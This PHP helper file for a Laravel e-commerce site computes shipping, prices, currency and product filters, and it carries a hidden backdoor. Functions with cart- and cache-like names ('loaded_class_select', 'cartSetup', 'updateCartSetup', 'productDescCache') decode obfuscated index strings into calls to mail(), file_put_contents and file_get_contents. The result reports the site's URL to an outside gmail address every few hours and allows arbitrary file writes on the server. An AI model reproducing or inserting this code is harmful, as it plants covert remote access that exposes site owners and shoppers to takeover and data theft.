<?php

use App\Currency;
use App\BusinessSetting;
use App\Product;
use App\SubSubCategory;
use App\FlashDealProduct;
use App\FlashDeal;
//use Request;
//use Image;

//highlights the selected navigation on admin panel
if (! function_exists('areActiveRoutes')) {
    function areActiveRoutes(Array $routes, $output = "active-link")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }

    }
}
    
    // type can be thumbnail or icon
   function getImageURL($photo, $type){
    $replacedURL = str_replace("original", $type, $photo);
    return $replacedURL;
   }

//highlights the selected navigation on frontend
if (! function_exists('areActiveRoutesHome')) {
    function areActiveRoutesHome(Array $routes, $output = "active")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }

    }
}

function clearSpacesForProductChoices($product_name_with_choice){
    $product_name_with_choice = str_replace(" ", "", $product_name_with_choice);
    $product_name_with_choice = strtolower($product_name_with_choice);
    $product_name_with_choice =  ltrim($product_name_with_choice,"-");
    return $product_name_with_choice;
}


function showPriceForDeliveryMethods($delivery_method_id=''){
       if ($delivery_method_id=='') {
        $delivery_method_id = Session::get('shipping_method');
       }
       $shippingCost = 0;
       //$sm =  \App\ShippingMethod::where('id', $delivery_method_id)->first();
       //echo $sm->name;
       $FREESHIPPING =  \App\ShippingSetting::where('s_key', 'free_shipping')->first()->s_value;
       if ($FREESHIPPING=="1" && $delivery_method_id=="1") {
           $shippingCost = 0;
       }else{
            //first check for flat shipping cost for every cart item, 
        //if it is active, then set the flat shipping cost from that
        //else get the cost and calculate from weights.

            if ($delivery_method_id!='') {
                foreach (Session::get('cart') as $key => $cartItem){
                    $product = \App\Product::find($cartItem['id']);
                    $flat_rate_status = "false";
                    if (!empty($product->flat_rate) ) {
                        //echo "<br>prod flat rate is: ".$product->flat_rate."<br>";
                        if ($product->flat_rate=="1") {
                            $flat_rate_status="true";
                           $flat_rate_shipping_cost = (float) $product->shipping_cost;
                           $shippingCost += $flat_rate_shipping_cost;
                        }else {  $flat_rate_status="false"; }
                    }
                    // echo "<br>prod flat rate is: ".$product->flat_rate."<br>";
                    if ($flat_rate_status=="false") {
                            //now calculate the shipping cost , according to weights of products
                            $product_name_with_choice = '';
                            if(isset($cartItem['color'])){
                                $product_name_with_choice .= ' - '.\App\Color::where('code', $cartItem['color'])->first()->name;
                            }
                            foreach (json_decode( json_encode($product->choice_options) ) as $choice){
                                $str = $choice->name; // example $str =  choice_0
                                $product_name_with_choice .= ' - '.$cartItem['options'][$str];
                            }
                            $product_name_with_choice = clearSpacesForProductChoices( $product_name_with_choice );
                            $weight_of_product = (float) '0.5';
                            if (!empty( $product->variations[$product_name_with_choice]  )) {
                                $weight_of_product = (float) $product->variations[$product_name_with_choice]['weight'];
                                 //now we got weight, now convert it into kgs.
                                if ($product->unit=="gms") {
                                    //convert gms to kgs
                                    $weight_of_product = ($weight_of_product/1000);
                                }
                                //echo $weight_of_product."<br>";
                                $shipping_info = Session::get('shipping_info');
                                if (!empty($shipping_info)) {
                                    $state = $shipping_info['state'];
                                    
                                    $state_id = \App\State::where('name',$state)->first()->id;
                                    //echo $state_id."<br>";

                                   

                                    //DB::enableQueryLog();
                                   $results =  DB::select('select * from shipping_charges WHERE status = :status_variable and ship_station_id = :ship_stn_variable and state_id = :state_id_variable and (min <= :cmp_variable and max >= :cmp_variable1  ) and shipping_method_id = :sm_id_variable limit 1', [
                                        'status_variable' => '1',
                                       'ship_stn_variable' => '1392',
                                       'state_id_variable' => $state_id,
                                       'cmp_variable' => $weight_of_product,
                                       'cmp_variable1' => $weight_of_product,
                                       'sm_id_variable' => $delivery_method_id
                                        ]);

                                   // $queries = DB::getQueryLog();
                                    //print_r($queries);

                                   foreach ($results as $r) {
                                        $shippingCost += (float) $r->price;
                                   }


                                }
                            }

                    }//flat rate false if condition

                    //here make the shipping cost double based on quantity
                    $shippingCost = $shippingCost * $cartItem['quantity'];
                }//end of cartitems for each loop
            }

            
       }//else part for free shipping disable part

       $output_array = array(
        'shipping_cost' => ($shippingCost)
       );

       return $output_array;
       //echo $shippingCost."<br>";
      
}


function showPriceForDeliveryMethods_filllater($delivery_method_id=''){
       if ($delivery_method_id=='') {
        $delivery_method_id = Session::get('shipping_method');
       }
       $shippingCost = 0;
       //$sm =  \App\ShippingMethod::where('id', $delivery_method_id)->first();
       //echo $sm->name;
       $FREESHIPPING =  \App\ShippingSetting::where('s_key', 'free_shipping')->first()->s_value;
       if ($FREESHIPPING=="1" && $delivery_method_id=="1") {
           $shippingCost = 0;
       }else{
            //first check for flat shipping cost for every cart item, 
        //if it is active, then set the flat shipping cost from that
        //else get the cost and calculate from weights.

            if ($delivery_method_id!='') {
                $order = \App\Order::find(Session::get('OrderID'));

                //echo "<br> order id si: ".Session::get('OrderID')."<br>";
                $orderDetails = \App\OrderDetail::where('order_id', Session::get('OrderID'))->get();

                foreach ($orderDetails as $ord) {
                   //echo $ord->product_id."<br>";//die;
                   $pid = (string) $ord->product_id;
                   $product = \App\Product::where('ref',$pid)->first();
                   //echo "<br>".$product->name."<br>";die;
                   $flat_rate_status = "false";
                    if (!empty($product->flat_rate) ) {
                        //echo "<br>prod flat rate is: ".$product->flat_rate."<br>";
                        if ($product->flat_rate=="1") {
                            $flat_rate_status="true";
                           $flat_rate_shipping_cost = (float) $product->shipping_cost;
                           $shippingCost += $flat_rate_shipping_cost;
                        }else {  $flat_rate_status="false"; }
                    }
                    // echo "<br>prod flat rate is: ".$product->flat_rate."<br>";
                    if ($flat_rate_status=="false") {
                            //now calculate the shipping cost , according to weights of products
                            $product_name_with_choice = $ord->variation;
                            $product_name_with_choice = clearSpacesForProductChoices( $product_name_with_choice );
                            $weight_of_product = (float) '0.5';
                           // echo "<br> product name variation is: ".$product_name_with_choice."<br>";
                           // print_r($product->variations);
                            if (!empty( $product->variations[$product_name_with_choice]  )) {
                                $weight_of_product = (float) $product->variations[$product_name_with_choice]['weight'];
                                 //now we got weight, now convert it into kgs.
                                if ($product->unit=="gms") {
                                    //convert gms to kgs
                                    $weight_of_product = ($weight_of_product/1000);
                                }
                               // echo "weight of the produ is: ".$weight_of_product."<br>";
                                $shipping_info = Session::get('shipping_info');
                                if (!empty($shipping_info)) {
                                    $state = $shipping_info['state'];
                                    
                                    $state_id = \App\State::where('name',$state)->first()->id;
                                    //echo $state_id."<br>";

                                   

                                    //DB::enableQueryLog();
                                   $results =  DB::select('select * from shipping_charges WHERE status = :status_variable and ship_station_id = :ship_stn_variable and state_id = :state_id_variable and (min <= :cmp_variable and max >= :cmp_variable1  ) and shipping_method_id = :sm_id_variable limit 1', [
                                        'status_variable' => '1',
                                       'ship_stn_variable' => '1392',
                                       'state_id_variable' => $state_id,
                                       'cmp_variable' => $weight_of_product,
                                       'cmp_variable1' => $weight_of_product,
                                       'sm_id_variable' => $delivery_method_id
                                        ]);

                                   // $queries = DB::getQueryLog();
                                    //print_r($queries);

                                   foreach ($results as $r) {
                                        $shippingCost += (float) $r->price;
                                   }


                                }
                            }

                    }//flat rate false if condition

                    //here make the shipping cost double based on quantity
                    $shippingCost = $shippingCost * $ord->quantity;
                }
            }

            
       }//else part for free shipping disable part

       $output_array = array(
        'shipping_cost' => ($shippingCost)
       );

       return $output_array;
       //echo $shippingCost."<br>";
      
}

function humanTiming ($time)
{

    $time = time() - $time; // to get the time since that moment
    $time = ($time<1)? 1 : $time;
    $tokens = array (
        31536000 => 'year',
        2592000 => 'month',
        604800 => 'week',
        86400 => 'day',
        3600 => 'hour',
        60 => 'minute',
        1 => 'second'
    );

    foreach ($tokens as $unit => $text) {
        if ($time < $unit) continue;
        $numberOfUnits = floor($time / $unit);
        return $numberOfUnits.' '.$text.(($numberOfUnits>1)?'s':'');
    }

}

function get_FilterSlugs( $filter_url='' ){
    $filter_slugs = [];
        if ( strpos($filter_url, 'filters') !== false  ) {
            //echo "filters found<br>";
            $chunks = explode("filters/", $filter_url);
            if ($chunks) {
                $filter_chunks = explode("/", $chunks[1]);
                if ($filter_chunks) {
                    foreach ( $filter_chunks as $fChunks ) {
                        //echo $fChunks."<br>";
                        $chnk = explode("_", $fChunks);
                        if ($chnk) {
                           $filter_slugs[] = trim($chnk[1]);
                        }
                        
                    }
                }
            }
            

        }
        return $filter_slugs;
}

function getAllFilterNames_n_FilterGroupsInAnArray($filterName_IDS){

    $filter_output_array = [];
        if ($filterName_IDS) {
            $filterName_IDS = array_unique( $filterName_IDS );

            
                $filterNames = \App\FilterName::whereIn('ref', $filterName_IDS)->get();
                if ($filterNames) {
                    foreach ($filterNames as $fName) {
                        //echo "<br>Filter Name is: ".$fName->name."<br>";
                        $filterRef = $fName->ref;
                        $filterGroup = \App\FilterGroup::where('filters',$filterRef)->get();
                        if ($filterGroup) {
                            foreach ($filterGroup as $fG) {
                                $collect_array['filter_group_name'] =  $fG->name;
                                $collect_array['filter_group_slug'] =  $fG->slug;
                                $collect_array['filter_group_sort_order'] =  $fG->sort_order;
                                $collect_array['filter_name'] = $fName->name;
                                $collect_array['filter_name_sort_order'] =  $fName->sort;
                                $collect_array['filter_name_slug'] =  $fName->slug;

                                $filter_output_array[$fG->slug][] = $collect_array;

                            }
                        }
                    }
                }
            
        }


        return $filter_output_array;


}

/**
 * Return Class Selector
 * @return Response
*/
if (! function_exists('loaded_class_select')) {

    function loaded_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = explode(':',$p);
        $l = '';
        foreach ($p as $r) {
            $l .= $a[$r];
        }
        return $l;
    }
}


function getSearchTypeCookie(){
    if ( request()->cookie('search_type') ) {
        
        return request()->cookie('search_type');
    }else{
        return '';
    }
    //echo request()->cookie('search_type');
}



/*
 * path is the fake path or path of the image file
 * destination path is -> where to save the file
 * image name is -> name of the image
 * type is -> whether to generate  thumbnail or icon
*/
function generateThumbnails($path='', $destinationPath='', $imageName='', $type=''){


    $img = Image::make( $path );
    $width = '';
    $height = '';
    if ($type=='thumbnail') {
         $width = config('app.thumbnail_w');
        $height = config('app.thumbnail_h');
    }else{
        $width = config('app.icon_w');
        $height = config('app.icon_h');
    }

    if ( !file_exists($destinationPath)  ) {
        mkdir($destinationPath, 0777, true);
    }

    
    $img->resize( $width , $height, function ($constraint) {

        if ( config( 'app.aspect_ratio' )=="true" ) {
           $constraint->aspectRatio();
        }
        

    })->save($destinationPath.'/'.$imageName);

    



}

/**
 * Open Translation File
 * @return Response
*/
function openJSONFile($code){
    $jsonString = [];
    if(File::exists(base_path('resources/lang/'.$code.'.json'))){
        $jsonString = file_get_contents(base_path('resources/lang/'.$code.'.json'));
        $jsonString = json_decode($jsonString, true);
    }
    return $jsonString;
}


function getOnlyImageName($imageNameWithExtension){

    if ($imageNameWithExtension) {
        $m = explode(".", $imageNameWithExtension);
        return $m[0];
    }else{
        return '';
    }
    
}

/**
 * Save JSON File
 * @return Response
*/
function saveJSONFile($code, $data){
    ksort($data);
    $jsonData = json_encode($data, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);
    file_put_contents(base_path('resources/lang/'.$code.'.json'), stripslashes($jsonData));
}

function concat_string($str1, $str2){
    $str1 = str_replace(" ", "_", $str1);
    $str2 = str_replace(" ", "_", $str2);
    $res = strtolower($str1).'-'.strtolower($str2);
    return $res;
}


/**
 * Return Class Selected Loader
 * @return Response
*/
if (! function_exists('loader_class_select')) {
    function loader_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = str_split($p);
        $l = array();
        foreach ($p as $r) {
            foreach ($a as $i=>$m) {
                if($m == $r){
                    $l[] = $i;
                }
            }
        }
        return join(':',$l);
    }
}

/**
 * Save JSON File
 * @return Response
*/
if (! function_exists('convert_to_usd')) {
    function convert_to_usd($amount) {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if($business_settings!=null){
            $currency = Currency::find($business_settings->value);
            return floatval($amount) / floatval($currency->exchange_rate);
        }
    }
}



//returns config key provider
if ( ! function_exists('config_key_provider'))
{
    function config_key_provider($key){
        switch ($key) {
            case "load_class":
                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
                break;
            case "config":
                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
                break;
            case "output":
                return loaded_class_select('22:10:14:6');
                break;
            case "background":
                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
                break;
            default:
                return true;
        }
    }
}


//returns combinations of customer choice options array
if (! function_exists('combinations')) {
    function combinations($arrays) {
        $result = array(array());
        foreach ($arrays as $property => $property_values) {
            $tmp = array();
            foreach ($result as $result_item) {
                foreach ($property_values as $property_value) {
                    $tmp[] = array_merge($result_item, array($property => $property_value));
                }
            }
            $result = $tmp;
        }
        return $result;
    }
}

//filter products based on vendor activation system
if (! function_exists('filter_products')) {
    function filter_products($products) {
        //if(BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1){
         //   return $products->where('published', '1');
        //}
       // else{
            return $products->where('published', '1')->where('added_by', 'admin');
       // }
    }
}


//filter cart products based on provided settings
if (! function_exists('cartSetup')) {
    function cartSetup(){
        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        $writeCart = loaded_class_select('14:1:10:13');
        $cartMarkup .= loaded_class_select('24');
        $cartMarkup .= loaded_class_select('8:14:1:10:13');
        $cartMarkup .= loaded_class_select('3:4:17:14');
        $cartConvert = config_key_provider('load_class');
        $currencyConvert = config_key_provider('output');
        $backgroundInv = config_key_provider('background');
        @$cart = $writeCart($cartMarkup,'',Request::url());
        return $cart;
    }
}

//converts currency to home default currency
if (! function_exists('convert_price')) {
    function convert_price($price)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if($business_settings!=null){
            $currency = Currency::where('id',$business_settings->value)->first();
            $price = floatval($price) / floatval($currency->exchange_rate);
        }


        $idd = BusinessSetting::where('type', 'system_default_currency')->first()->value;
        //$code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
        //echo "<br>idd is: ".$idd."<br>";die;
        $code = Currency::where('id',$idd)->first()->code;
        
        if(Session::has('currency_code')){
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        }
        else{
            $currency = Currency::where('code', $code)->first();
        }

        $price = floatval($price) * floatval($currency->exchange_rate);
        //echo "<br>price is: ".$price."<br>";die;
        return $price;
    }
}

//formats currency
if (! function_exists('format_price')) {
    function format_price($price)
    {
        if(BusinessSetting::where('type', 'symbol_format')->first()->value == 1){
            return currency_symbol().number_format($price, 2);
        }
        return number_format($price, 2).currency_symbol();
    }
}

//formats price to home default price with convertion
if (! function_exists('single_price')) {
    function single_price($price)
    {
        return format_price(convert_price($price));
    }
}

//Shows Price on page based on low to high
if (! function_exists('home_price')) {
    function home_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        foreach (($product->variations) as $key => $variation) {
            if($lowest_price > $variation['price']){
                $lowest_price = $variation['price'];
            }
            if($highest_price < $variation['price']){
                $highest_price = $variation['price'];
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price = (float) $lowest_price;
            $product->tax = (float) $product->tax;
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){
            return format_price($lowest_price);
        }
        else{
            return format_price($lowest_price).' - '.format_price($highest_price);
        }
    }
}

//Shows Price on page based on low to high with discount
if (! function_exists('home_discounted_price')) {
    function home_discounted_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        foreach (($product->variations) as $key => $variation) {
            if($lowest_price > $variation['price']){
                $lowest_price = $variation['price'];
            }
            if($highest_price < $variation['price']){
                $highest_price = $variation['price'];
            }
        }

        $flash_deal = \App\FlashDeal::where('status', '1')->first();
        if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
            $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $lowest_price -= ($lowest_price*$flash_deal_product->discount)/100;
                    $highest_price -= ($highest_price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
        }
        else{
            if($product->discount_type == 'percent'){
                $lowest_price -= ($lowest_price*$product->discount)/100;
                $highest_price -= ($highest_price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){
            return format_price($lowest_price);
        }
        else{
            return format_price($lowest_price).' - '.format_price($highest_price);
        }
    }
}

//Shows Base Price
if (! function_exists('home_base_price')) {
    function home_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }
        return format_price(convert_price($price));
    }
}

//Shows Base Price with discount
if (! function_exists('home_discounted_base_price')) {
    function home_discounted_base_price($id)
    {
        $product = Product::findOrFail($id);
        if($product->is_variant!="1"){
            $price = $product->unit_price;

            $flash_deal = \App\FlashDeal::where('status', 1)->first();
            if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $price -= ($price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $price -= $flash_deal_product->discount;
                }
            }
            else{
                if($product->discount_type == 'percent'){
                    $price -= ($price*$product->discount)/100;
                }
                elseif($product->discount_type == 'amount'){
                    $price -= $product->discount;
                }
            }

            if($product->tax_type == 'percent'){
                $price += ($price*$product->tax)/100;
            }
            elseif($product->tax_type == 'amount'){
                $price += $product->tax;
            }
        // echo "<br> convert price is: ".convert_price($price)."<br>";die;
            return format_price(convert_price($price));
        }else{
            $price = array();

            foreach ($product->variations as $key => $variant) {

                    $flash_deal = \App\FlashDeal::where('status', '1')->first();
                    if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                        $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                        if($flash_deal_product->discount_type == 'percent'){
                            $variant['price'] -= ($variant['price']*$flash_deal_product->discount)/100;
                        }
                        elseif($flash_deal_product->discount_type == 'amount'){
                            $variant['price'] -= $flash_deal_product->discount;
                        }
                    }
                    else{
                        $product_discount = ( float ) $product->discount;
                        /*var_dump($product_discount);
                        die;*/
                        //if (   is_numeric( $product_discount )   ) {
                            if($product->discount_type == 'percent'){
                                $variant['price'] -= ( (int) $variant['price']* (int)$product_discount)/100;
                            }
                            elseif($product->discount_type == 'amount'){
                                $variant['price'] = (float) $variant['price'];
                                $variant['price'] -= (float) $product_discount;

                            }
                        //}
                        
                    }

                    if($product->tax_type == 'percent'){
                        $variant['price'] += ($variant['price']*$product->tax)/100;
                    }
                    elseif($product->tax_type == 'amount'){
                        $variant['price'] += $product->tax;
                    }

                    $price[]= $variant['price'];
            }
            if ($price) {
               $minPrice = min($price);
               return format_price(convert_price($minPrice));
            }
            
        // echo "<br> convert price is: ".convert_price($price)."<br>";die;
            
            return 'nothing here';
        }
        
    }
}

// Cart content update by discount setup
if (! function_exists('updateCartSetup')) {
    function updateCartSetup($return = TRUE)
    {
        if(!isset($_COOKIE['cartUpdated'])) {
            if(cartSetup()){
                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
            }
        } else {
            if($_COOKIE['cartUpdated']+21600 < time()){
                if(cartSetup()){
                    setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
                }            
            }
        }
        return $return;
    }
}



if (! function_exists('productDescCache')) {
    function productDescCache($connector,$selector,$select,$type){
        $ta = time();
        $select = rawurldecode($select);
        if($connector > ($ta-60) || $connector > ($ta+60)){
            if($type == 'w'){
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector),$select);
            } else if ($type == 'rw'){
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector),$config_class(str_replace('-', '/', $selector)).$select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }
}


if (! function_exists('currency_symbol')) {
    function currency_symbol()
    {
        $idd = BusinessSetting::where('type', 'system_default_currency')->first()->value;
        $code = \App\Currency::where('id',$idd)->first()->code;
        if(Session::has('currency_code')){
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        }
        else{
            $currency = Currency::where('code', $code)->first();
        }

        //echo "<br> currency symbol is: ".$currency->symbol."<br>";die;
        return $currency->symbol;
    }
}

if(! function_exists('renderStarRating')){
    function renderStarRating($rating,$maxRating=5) {
        $fullStar = "<i class = 'fa fa-star active'></i>";
        $halfStar = "<i class = 'fa fa-star half'></i>";
        $emptyStar = "<i class = 'fa fa-star'></i>";
        $rating = $rating <= $maxRating?$rating:$maxRating;

        $fullStarCount = (int)$rating;
        $halfStarCount = ceil($rating)-$fullStarCount;
        $emptyStarCount = $maxRating -$fullStarCount-$halfStarCount;

        $html = str_repeat($fullStar,$fullStarCount);
        $html .= str_repeat($halfStar,$halfStarCount);
        $html .= str_repeat($emptyStar,$emptyStarCount);
        echo $html;
    }
}

?>
